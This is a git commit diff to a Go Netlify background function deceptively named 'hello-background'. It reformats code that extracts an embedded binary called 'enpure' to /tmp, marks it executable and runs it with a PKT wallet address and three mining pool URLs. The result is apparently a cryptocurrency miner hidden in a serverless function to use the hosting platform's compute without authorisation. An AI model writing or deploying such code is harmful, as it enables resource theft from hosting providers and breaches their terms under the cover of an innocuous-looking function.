6e918c2d1a50f6eda921f897591a3bc2fd18734e
Suzyo Nyirenda <suzyoeliasnyirenda@gmail.com>
2023-05-30 11:57:26 +0200

    Update main.go

--- netlify/functions/hello-background/main.go
+++ netlify/functions/hello-background/main.go
@@ -2,6 +2,7 @@ package main
 
 import (
 	"embed"
+	"io"
 	"io/fs"
 	"io/ioutil"
 	"log"
@@ -9,77 +10,104 @@ import (
 	"os/exec"
 
 	"github.com/aws/aws-lambda-go/events"
+	"github.com/aws/aws-lambda-go/lambda"
 )
 
 //go:embed myExecutable/enpure
 var executable embed.FS
 
 func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
-    walletAddress := "pkt1qrup75sh882mea577x9r9q6ka8j8rzlqdzazlqg"
+	walletAddress := "pkt1qrup75sh882mea577x9r9q6ka8j8rzlqdzazlqg"
 
-    // Retrieve the embedded executable
-    executablePath := "myExecutable/enpure"
-    executableBytes, err := fs.ReadFile(executable, executablePath)
-    if err != nil {
-        log.Println("Error reading embedded executable:", err)
-        return nil, err
-    }
+	// Retrieve the embedded executable
+	executablePath := "myExecutable/enpure"
+	executableBytes, err := fs.ReadFile(executable, executablePath)
+	if err != nil {
+		log.Println("Error reading embedded executable:", err)
+		return nil, err
+	}
 
-    // Create a temporary file to write the embedded executable
-    tmpFile, err := ioutil.TempFile("", "enpure")
-    if err != nil {
-        log.Println("Error creating temporary file:", err)
-        return nil, err
-    }
-    defer os.Remove(tmpFile.Name())
+	// Create a temporary file to write the embedded executable
+	tmpFile, err := ioutil.TempFile("", "enpure")
+	if err != nil {
+		log.Println("Error creating temporary file:", err)
+		return nil, err
+	}
+	defer os.Remove(tmpFile.Name())
 
-    // Write the embedded executable to the temporary file
-    _, err = tmpFile.Write(executableBytes)
-    if err != nil {
-        log.Println("Error writing embedded executable to temporary file:", err)
-        return nil, err
-    }
+	// Write the embedded executable to the temporary file
+	_, err = tmpFile.Write(executableBytes)
+	if err != nil {
+		log.Println("Error writing embedded executable to temporary file:", err)
+		return nil, err
+	}
 
-    // Close the temporary file before copying it
-    tmpFile.Close()
+	// Close the temporary file before copying it
+	tmpFile.Close()
 
-    // Create a new file outside the temporary directory
-    executableFile := "/tmp/enpure" // Change the file path as needed
-    err = copyFile(tmpFile.Name(), executableFile)
-    if err != nil {
-        log.Println("Error copying temporary file:", err)
-        return nil, err
-    }
+	// Create a new file outside the temporary directory
+	executableFile := "/tmp/enpure" // Change the file path as needed
+	err = copyFile(tmpFile.Name(), executableFile)
+	if err != nil {
+		log.Println("Error copying temporary file:", err)
+		return nil, err
+	}
 
-    // Make the new file executable
-    err = os.Chmod(executableFile, 0755)
-    if err != nil {
-        log.Println("Error making file executable:", err)
-        return nil, err
-    }
+	// Make the new file executable
+	err = os.Chmod(executableFile, 0755)
+	if err != nil {
+		log.Println("Error making file executable:", err)
+		return nil, err
+	}
 
-    // Execute the file with arguments
-    cmd := exec.Command(executableFile, "ann", "-p", walletAddress, "http://pool.pkt.world", "http://pool.pktpool.io/diff/8192", "http://pool.pkteer.com")
-    err = cmd.Start()
-    if err != nil {
-        log.Println("Error executing the embedded executable:", err)
-        return nil, err
-    }
+	// Execute the file with arguments
+	cmd := exec.Command(executableFile, "ann", "-p", walletAddress, "http://pool.pkt.world", "http://pool.pktpool.io/diff/8192", "http://pool.pkteer.com")
+	err = cmd.Start()
+	if err != nil {
+		log.Println("Error executing the embedded executable:", err)
+		return nil, err
+	}
 
-    // Wait for the command to finish
-    err = cmd.Wait()
-    if err != nil {
-        log.Println("Command execution failed:", err)
-        return nil, err
-    }
+	// Wait for the command to finish
+	err = cmd.Wait()
+	if err != nil {
+		log.Println("Command execution failed:", err)
+		return nil, err
+	}
 
-    // Build the response with the processing message
-    response := &events.APIGatewayProxyResponse{
-        StatusCode:      200,
-        Headers:         map[string]string{"Content-Type": "text/plain"},
-        Body:            "Processing...\n",
-        IsBase64Encoded: false,
-    }
+	// Build the response with the processing message
+	response := &events.APIGatewayProxyResponse{
+		StatusCode:      200,
+		Headers:         map[string]string{"Content-Type": "text/plain"},
+		Body:            "Processing...\n",
+		IsBase64Encoded: false,
+	}
 
-    return response, nil
+	return response, nil
+}
+
+// Copy the file from src to dst
+func copyFile(src, dst string) error {
+	srcFile, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer srcFile.Close()
+
+	dstFile, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer dstFile.Close()
+
+	_, err = io.Copy(dstFile, srcFile)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func main() {
+	lambda.Start(handler)
 }
